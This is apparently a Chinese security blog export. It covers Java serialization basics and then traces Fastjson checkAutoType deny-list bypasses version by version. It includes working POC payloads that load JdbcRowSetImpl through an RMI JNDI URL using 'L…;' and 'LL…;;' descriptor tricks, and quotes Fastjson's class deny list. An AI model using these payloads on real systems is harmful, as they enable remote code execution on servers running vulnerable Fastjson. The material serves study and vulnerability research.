<li>对象复制和深拷贝：</li>
</ul>
<p>有时需要对对象进行复制或深拷贝，在内存中创建一个与原始对象完全相同的新对象。通过序列化和反序列化，可以实现对象的深度复制，即创建一个与原始对象相互独立的副本。</p>
<ul>
<li>分布式计算和集群：</li>
</ul>
<p>在分布式计算和集群环境中，任务可以在不同的节点上并行执行。通过序列化和反序列化，可以将任务对象传输到具体的执行节点，以便执行远程调用。</p>
<h1 id="0x03-序列化和反序列化的实现"><a href="#0x03-序列化和反序列化的实现" class="headerlink" title="0x03 序列化和反序列化的实现"></a>0x03 序列化和反序列化的实现</h1><h2 id="实现序列化和反序列话的条件"><a href="#实现序列化和反序列话的条件" class="headerlink" title="实现序列化和反序列话的条件"></a>实现序列化和反序列话的条件</h2><p>只有实现了Serializable或者Externalizable接口的类的对象才能被序列化为字节序列，不然会抛出异常。</p>
<ul>
<li>Serializable 接口</li>
</ul>
<p><code>Serializable</code> 是 Java 中的一个接口，它是一个标记接口，不包含任何方法。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><ul>
<li>TestPerson类</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPerson</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestPerson</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;TestPerson&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>对TestPerson类进行序列化操作，并将生成的字节序列写入 ser.bin 文件中</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSerializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建一个 FileOutputStream 对象，用于写入字节流到文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建一个 ObjectOutputStream 对象，用于将对象转换为字节流</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut);</span><br><span class="line">        <span class="comment">// 将 person 对象写入到 ObjectOutputStream 中，进行序列化</span></span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOut.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;TestPerson 对象已经序列化到 person.ser 文件.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TestPerson</span> <span class="variable">testPerson</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestPerson</span>(<span class="string">&quot;kk&quot;</span>, <span class="number">12</span>);</span><br><span class="line"><span class="comment">//        System.out.println(testPerson);</span></span><br><span class="line">        serialize(testPerson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">TestPerson&#123;name=&#x27;kk&#x27;, age=12&#125;</span></span><br><span class="line"><span class="comment">TestPerson 对象已经序列化到 ser.bin 文件.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>从序列化的字节序列中恢复 TestPerson对象</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestUnserialize</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">testUnserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 创建一个 FileInputStream 对象，用于从文件中读取字节流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建一个 ObjectInputStream 对象，用于将字节流转换为对象</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从 ObjectInputStream 中读取字节流</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭资源</span></span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        fileInputStream.close();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//将其反序列化为 Person 对象</span></span><br><span class="line">        <span class="type">TestPerson</span> <span class="variable">testPerson</span> <span class="operator">=</span> (TestPerson) testUnserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        System.out.println(testPerson);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出结果：</span></span><br><span class="line"><span class="comment">TestPerson&#123;name=&#x27;kk&#x27;, age=12&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h2 id="transient-修饰符"><a href="#transient-修饰符" class="headerlink" title="transient 修饰符"></a>transient 修饰符</h2><ul>
<li>当一个成员变量被 <code>transient</code> 修饰时，它将不会被默认的序列化机制序列化。</li>
<li>当对象被序列化时，被 <code>transient</code> 修饰的字段会被忽略，并且在反序列化过程中会被赋予默认值（例如数值类型为0，引用类型为null）</li>
<li><code>transient</code> 只对对象的序列化有效，并不影响对象的其他行为和方法调用</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestPerson</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="comment">//    private String name;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestPerson</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;TestPerson&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>TestSerialize</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">输出结果：</span><br><span class="line">TestPerson&#123;name=<span class="string">&#x27;kk&#x27;</span>, age=<span class="number">12</span>&#125;</span><br><span class="line">TestPerson 对象已经序列化到 ser.bin 文件.</span><br></pre></td></tr></table></figure></div>

<ul>
<li>TestUnserialize</li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">输出结果：</span><br><span class="line">TestPerson&#123;name=<span class="string">&#x27;null&#x27;</span>, age=<span class="number">12</span>&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="0x04-为什么会产生安全问题"><a href="#0x04-为什么会产生安全问题" class="headerlink" title="0x04 为什么会产生安全问题"></a>0x04 为什么会产生安全问题</h1><p>只要服务器反序列化数据，客户端传递类的readObject中代码会自动执行，给予攻击者在服务器上运行代码的能力。</p>
<h2 id="可能存在的形式"><a href="#可能存在的形式" class="headerlink" title="可能存在的形式"></a>可能存在的形式</h2><ul>
<li>入口类的readObject直接调用危险方法。</li>
</ul>
<p>HashMap&lt;Object,Object&gt;、Hashtable&lt;Object,Object&gt; ……</p>
<ul>
<li>入口类参数中包含可控类，该类有危险方法，readObject时调用</li>
<li>入口类参数中包含可控类，该类又调用其他危险方法的类，readObject时调用</li>
</ul>
<h1 id="0x05-重写writeObject和readObject"><a href="#0x05-重写writeObject和readObject" class="headerlink" title="0x05 重写writeObject和readObject"></a>0x05 重写writeObject和readObject</h1><p>开发者可以重写 writeObject和readObject 方法，这样在序列化&#x2F;反序列化时，系统会调用自定义的 writeObject和readObject 方法而不是使用默认的方法。</p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>Java序列化与反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson反序列化(三)</title>
    <url>/2023/10/07/Java%E5%AE%89%E5%85%A8/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%E4%B8%89)/</url>
    <content><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>从1.2.24之后的版本，都有许多修复跟绕过，跟着网上的文章复现学习一下</p>
<h1 id="0x01-历史版本绕过"><a href="#0x01-历史版本绕过" class="headerlink" title="0x01 历史版本绕过"></a>0x01 历史版本绕过</h1><h2 id="fastjson-1-2-25"><a href="#fastjson-1-2-25" class="headerlink" title="fastjson-1.2.25"></a>fastjson-1.2.25</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们先来看一下<strong>1.2.25</strong>这个版本是怎么修复的</p>
<p>主要是引入了<strong>checkAutoType</strong>安全机制，会对要加载的类进行白名单和黑名单限制，并且引入了一个配置参数<strong>AutoTypeSupport</strong></p>
<p>默认情况下<strong>autoTypeSupport</strong>关闭，导致不能直接反序列化任意类</p>
<p>在不开启<strong>autoTypeSupport</strong>的情况下，会先进行<strong>黑名单检测</strong>再进行<strong>白名单检测</strong></p>
<p>如果在<strong>黑名单</strong>里，会直接抛出异常</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (!autoTypeSupport) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">                <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> clazz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在开启<strong>autoTypeSupport</strong>的情况下，会先进行<strong>白名单检测</strong>再进行<strong>名单检测</strong></p>
<p>如果在<strong>白名单</strong>里，会使用<strong>TypeUtils.loadClass</strong>加载</p>
<p>然后在判断是否在<strong>黑名单</strong>里，在的会抛出异常</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是，还有一种情况，如果<strong>黑白名单</strong>里都不存在的话</p>
<p>并且开启了<strong>autoTypeSupport</strong>或者<strong>expectClass</strong>不为空的话，也会调用<strong>TypeUtils.loadClass</strong>加载类</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着跟一下<strong>loadClass</strong> ，这个类在加载目标类之前为了兼容带有描述符的类名，使用了递归调用来处理描述符中的**[<strong>、</strong>L<strong>、</strong>;** 字符</p>
<p>那么加上<strong>L</strong>开头和**;**结尾实际上就可以绕过所有黑名单</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>白名单acceptList</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">AUTO_TYPE_ACCEPT_LIST --&gt; []</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>黑名单denyList</strong></li>
</ul>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel,org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure></div>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a><strong>POC</strong></h3><p><strong>JNDI</strong>+<strong>RMI</strong>为例</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class JdbcRowSetImpl &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br><span class="line">        String s = &quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;,&quot; +</span><br><span class="line">                &quot;\&quot;autoCommit\&quot;:false&#125;&quot;;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>影响版本</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.2.25 &lt;= fastjson &lt;= 1.2.41</span><br></pre></td></tr></table></figure></div>

<p>需开启<strong>autoTypeSupport</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div>

<p><strong>@type</strong>添加<strong>L</strong>和**;**绕过</p>
<h2 id="fastjson-1-2-42"><a href="#fastjson-1-2-42" class="headerlink" title="fastjson-1.2.42"></a>fastjson-1.2.42</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>在<strong>1.2.42</strong>版本中，<strong>fastjson</strong>依旧延续<strong>黑白名单</strong>的检测模式，不过将名单改成<strong>Hash</strong>值，防止绕过</p>
<p>还是继续关注<strong>com.alibaba.fastjson.parser.ParserConfig</strong>这个类</p>
<p>在<strong>checkAutoType</strong>中，首先会利用<strong>substring</strong>将<strong>L</strong>和**;**去掉</p>
<p>不过只删除一次，所以其实可以对描述符双写绕过这个限制</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">            ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">            * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而且这个类中也给出了<strong>Hash</strong>算法<strong>fnv1a_64</strong>，在<strong>addDeny</strong>中调用，所以还是有机会撞出来的<strong>Hash</strong>值的</p>
<p>网上也有<a class="link"   href="https://github.com/LeadroyaL/fastjson-blacklist" >黑白名单 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addDeny</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> TypeUtils.fnv1a_64(name);</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">fnv1a_64</span><span class="params">(String key)</span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hashCode</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; key.length(); ++i)&#123;</span><br><span class="line">        <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> key.charAt(i);</span><br><span class="line">        hashCode ^= ch;</span><br><span class="line">        hashCode *= <span class="number">0x100000001b3L</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><p><strong>注：</strong>需开启<strong>autoTypeSupport</strong></p>
<p><strong>影响版本：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:8085/CalcTest\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="fastjson-1-2-43"><a href="#fastjson-1-2-43" class="headerlink" title="fastjson-1.2.43"></a>fastjson-1.2.43</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>在<strong>1.2.43</strong>的版本中，修复了描述符双写绕过的漏洞</p>
<p>主要还是在<strong>com.alibaba.fastjson.parser.ParserConfig.checkAutoType</strong>中的判断，修复了多层绕过</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, <span class="type">int</span> features) &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">BASIC</span> <span class="operator">=</span> <span class="number">0xcbf29ce484222325L</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">long</span> <span class="variable">PRIME</span> <span class="operator">=</span> <span class="number">0x100000001b3L</span>;</span><br><span class="line">    <span class="keyword">if</span> ((((BASIC</span><br><span class="line">            ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">            * PRIME)</span><br><span class="line">            ^ className.charAt(className.length() - <span class="number">1</span>))</span><br><span class="line">            * PRIME == <span class="number">0x9198507b5af98f0L</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((((BASIC</span><br><span class="line">                ^ className.charAt(<span class="number">0</span>))</span><br><span class="line">                * PRIME)</span><br><span class="line">                ^ className.charAt(<span class="number">1</span>))</span><br><span class="line">                * PRIME == <span class="number">0x9195c07b5af5345L</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 9195c07b5af5345</span></span><br><span class="line">        className = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>虽然不能双写<strong>L</strong>和**;<strong>绕过了，但是还可以使用</strong>[<strong>和</strong>{**绕过</p>
<p>添加第一个**[<strong>，变成</strong>“@type”:”[com.sun.rowset.JdbcRowSetImpl”**会报错</p>
